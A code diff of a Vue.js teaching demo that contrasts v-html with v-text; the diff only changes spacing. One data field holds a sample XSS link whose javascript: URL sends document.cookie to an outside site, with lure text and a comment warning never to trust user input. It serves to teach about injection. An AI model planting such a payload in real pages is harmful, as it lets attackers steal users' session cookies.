@@ -28,12 +28,12 @@
     Vue.config.productionTip = false;
     new Vue({
         el: "#root",
-        data:{
-            name:'上海',
+        data: {
+            name: '上海',
             //注意v-html会解析标签，这点与v-text不一样
-            str:'<h1>hello, shanghai</h1>',
+            str: '<h1>hello, shanghai</h1>',
             //危险行为 永远不要相信用户的输入
-            str2:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了兄弟</a>'
+            str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了兄弟</a>'
         }
     })
 </script>
